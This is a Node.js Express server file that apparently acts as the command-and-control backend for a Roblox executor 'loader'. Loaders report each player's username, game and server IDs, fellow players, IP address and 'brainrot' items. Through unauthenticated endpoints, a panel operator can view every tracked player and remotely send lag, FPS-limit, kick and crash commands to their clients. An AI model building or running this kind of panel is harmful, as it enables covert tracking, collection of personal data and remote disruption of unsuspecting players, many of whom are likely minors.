const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// In-memory storage
const players = new Map();
const pastPlayers = new Map();
const commandStates = new Map();

// Cleanup offline players every 10 seconds
setInterval(() => {
    const now = Date.now();
    for (const [userId, player] of players) {
        if (now - player.lastHeartbeat > 20000) {
            player.online = false;
            pastPlayers.set(userId, player);
            players.delete(userId);
        }
    }
}, 10000);

// POST /api/public/heartbeat - Receive player data from loader
app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }

    const player = {
        user_id: data.user_id,
        username: data.username || 'Unknown',
        display_name: data.display_name || data.username || 'Unknown',
        avatar_url: data.avatar_url || '',
        place_id: data.place_id || '',
        game_name: data.game_name || 'Unknown Game',
        job_id: data.job_id || '',
        executor: data.executor || 'unknown',
        server_players: data.server_players || [],
        ip_address: data.ip_address || '',
        brainrots: data.brainrots || [],
        lastHeartbeat: Date.now(),
        online: true,
    };

    players.set(data.user_id, player);

    if (!commandStates.has(data.user_id)) {
        commandStates.set(data.user_id, { fps_limit: false, lag_n: false, lag_c: false, kick: false, crash: false });
    }

    res.json({ success: true, message: 'Heartbeat received' });
});

// GET /api/public/command - Send commands to loader
app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) {
        return res.status(400).json({ error: 'Missing user_id' });
    }

    const state = commandStates.get(userId) || { fps_limit: false, lag_n: false, lag_c: false, kick: false, crash: false };
    const cmd = { ...state };

    // Clear one-shot commands after sending
    const s = commandStates.get(userId);
    if (s) {
        s.kick = false;
        s.crash = false;
    }

    res.json(cmd);
});

// POST /api/command - Panel sends commands to player
app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;

    if (!user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }

    const state = commandStates.get(user_id);
    if (!state) {
        return res.status(404).json({ error: 'Player not found' });
    }

    if (fps_limit !== undefined) state.fps_limit = fps_limit;
    if (lag_n !== undefined) state.lag_n = lag_n;
    if (lag_c !== undefined) state.lag_c = lag_c;
    if (kick) state.kick = true;
    if (crash) state.crash = true;

    res.json({ success: true });
});

// GET /api/players - Get all players for panel
app.get('/api/players', (req, res) => {
    const allPlayers = [
        ...Array.from(players.values()),
        ...Array.from(pastPlayers.values()).filter(p => !players.has(p.user_id))
    ];
    res.json({ players: allPlayers });
});

// GET /api/command_state - Get command state for a player
app.get('/api/command_state', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) {
        return res.status(400).json({ error: 'Missing user_id' });
    }

    const state = commandStates.get(userId) || { fps_limit: false, lag_n: false, lag_c: false };
    res.json(state);
});

// Serve static files (the panel HTML)
app.use(express.static('public'));

app.listen(PORT, () => {
    console.log(`Panel server running on port ${PORT}`);
});
